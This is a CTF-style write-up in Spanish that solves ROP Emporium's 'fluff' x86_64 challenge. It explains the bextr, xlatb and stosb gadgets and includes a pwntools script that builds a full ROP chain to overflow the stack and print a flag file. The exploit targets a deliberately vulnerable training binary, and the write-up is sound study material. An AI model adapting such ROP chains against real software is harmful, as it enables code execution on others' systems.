# fluff

![2025-05-31-155232_808x308_scrot](https://github.com/user-attachments/assets/b21c28b9-2843-4129-b7d4-d66bd9cb58e3)

Mi hardware no soporta bmi1 (binary manipulation instructions) por lo que tuve que emular otra cpu con qemu para poder probar mis exploits.

# x86_64

Mas o menos la misma historia, revisamos `usefulGadgets` y tenemos estos:
```
write_gadget_1 = 0x0040062a          # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret
write_gadget_2 = 0x0000000000400628  # xlatb ; ret
write_gadget_3 = 0x0000000000400639  # stosb byte ptr [rdi], al ; ret
```

El primero usa `bextr`, una instruccion que almacena bits de rdx en rbx segun el contenido de rcx, en breve veremos eso.

El segundo usa `xlatb`, que toma el valor en la direccion [rbx+al] y lo almacena de vuelta en al. O sea que al es el indice tambien.

El tercero usa `stosb`, que practicamente hace lo mismo que mov.

Referencia: https://www.felixcloutier.com/x86/

La estrategia para escribir "flag.txt" en `.data` es la siguiente:
1. Almacenamos la direccion de un byte que contenga un caracter de 'flag.txt' en `rbx` con el primer gadget
2. Copiamos ese byte a `al` con el segundo gadget
3. Copiamos el byte a `.data` con el tercer gadget (para esto tambien necesitamos usar un gadget pop_rdi)

### Paso 1
Segun la documentacion en `rcx[0:7]` se almacena START o indice a partir de donde se comienzan a extraer bytes de `rdx` (LSB), y en `rcx[8:15]` se almacena LENGTH, que es la cantidad de bits que se van a extraer.

La instruccion `add rcx, 0x3ef2;` es una molestia pero se puede resolver con desplazamiento. Si almacenamos el byte en los 32 bits mas significativos y solo extraemos estos entonces resolvemos el problema.

Digamos: `$rdx=0x000000FF00000000` 

cuando se sume queda asi :`$rdx=0x000000FF000003ef2` 

Y extraemos [32:63], quedandonos con `0x000000FF`, nuestro byte.

### Paso 2
En `rbx` almacenamos la direccion del byte (read_addr) - al, porque entonces cuando se ejecute `xlatb`: read_addr - al + al = read_addr.

Para encontrar el valor de al antes de la llamada al gadget debemos usar un debugger para detenernos antes de la llamada al gadget:
``` python
#!/bin/python3
from pwn import *

gadget = 0x00400628
payload = b'A' * 40 + p64(gadget)

# replace tmux with your terminal
context.terminal = ['tmux', 'splitw', '-hp', '70']

# break when ropchain starts
io = gdb.debug('./fluff', '''
               b *0x00400628
               c
               ''')
io.send(payload)
io.interactive()
```

```
pwndbg> info registers al
al             0xb                 11
```

Para encontrar los bytes que vamos a escribir en memoria podemos usar r2:
```
 r2 -A fluff 2>/dev/null
[0x00400520]> / f
0x004003c4 hit0_0 .libfluff.so__gmon_s.
0x004003c7 hit0_1 .libfluff.so__gmon_star.
0x004003c8 hit0_2 .libfluff.so__gmon_start.
0x004003e2 hit0_3 .n_start__print_filepwnme_init.
0x004003f4 hit0_4 .lepwnme_init_finilibc.so.6__.
0x00400552 hit0_5 .@ Df.@U8.
0x0040058a hit0_6 .]8`D]fD8`UH8.
0x004005ca hit0_7 .t]8`]fD=a uUH.
0x004005f6 hit0_8 . ]D@f.UH].
0x004006a6 hit0_9 .H[]A\A]A^A_f.H.
[0x00400520]> / l
0x00400239 hit1_0 ./lib64/ld-linux-x8.
0x0040023f hit1_1 ./lib64/ld-linux-x86-64.s.
0x00400242 hit1_2 ./lib64/ld-linux-x86-64.so.2.
0x004003c1 hit1_3 .@libfluff.so__gmo.
0x004003c5 hit1_4 .libfluff.so__gmon_st.
0x004003e4 hit1_5 .start__print_filepwnme_init_f.
0x004003f9 hit1_6 .nme_init_finilibc.so.6__libc_.
0x00400405 hit1_7 .inilibc.so.6__libc_start_main_.
[0x00400520]> / a
0x004003d6 hit2_0 .uff.so__gmon_start__print_file.
0x0040040c hit2_1 .c.so.6__libc_start_main_edata_.
0x00400411 hit2_2 .6__libc_start_main_edata__bss_.
0x00400418 hit2_3 .c_start_main_edata__bss_start_.
0x0040041a hit2_4 .start_main_edata__bss_start_en.
0x00400424 hit2_5 ._edata__bss_start_endGLIBC_2..
0x004005d2 hit2_6 .]fD=a uUH~.
```

Podemos usar la direccion que nos convenga.

## Paso 3

Escribimos el byte en `.data` + offset, actualizando al con el valor del ultimo byte en cada iteracion.

Exploit:
``` python
from pwn import *
import sys

data_addr = 0x00601028
pop_rdi = 0x00000000004006a3         # pop rdi ; ret
print_file_addr = 0x00400510

write_gadget_1 = 0x0040062a          # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret
write_gadget_2 = 0x0000000000400628  # xlatb ; ret
write_gadget_3 = 0x0000000000400639  # stosb byte ptr [rdi], al ; ret


char_map = {'f': 0x0040058a, 'l': 0x004003e4, 'a': 0x00400424,
            'g': 0x004003cf, '.': 0x004003fd, 't': 0x004003e0,
            'x': 0x00400725}
target_str = "flag.txt"

def write_in_data(addrs):
    p = b""
    al = 11
    for i,char in enumerate(target_str):
        read_addr = char_map[char]
        # set rbx to read_addr
        # rdx[....|LENGTH|START]  to extract higher 32 bits
        rdx = p8(32) + p8(32) + p32(0) + p16(0)
        # rcx = 0xAAAAAAAA0000000 + 0x3ef2 = 0xAAAAAAAA00003ef2
        rcx = p32(0) + p32(read_addr - al)
        p += p64(write_gadget_1) + rdx + rcx
        # xlab does al = [rbx+al]
        p += p64(write_gadget_2)
        p += p64(pop_rdi) + p64(data_addr + i)
        p += p64(write_gadget_3)
        al = ord(char)
    return p

payload = b"A" * 40
payload += write_in_data(char_map)  
payload += p64(pop_rdi)
payload += p64(data_addr)           
payload += p64(print_file_addr)

sys.stdout.buffer.write(payload)
```

``` 
qemu-x86_64 -cpu Haswell ./fluff <<< $(python3 s64.py)
qemu-x86_64: warning: TCG doesn't support requested feature: CPUID.07H:EBX.hle [bit 4]
qemu-x86_64: warning: TCG doesn't support requested feature: CPUID.07H:EBX.rtm [bit 11]
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
zsh: segmentation fault  qemu-x86_64 -cpu Haswell ./fluff <<< $(python3 s64.py)  
```


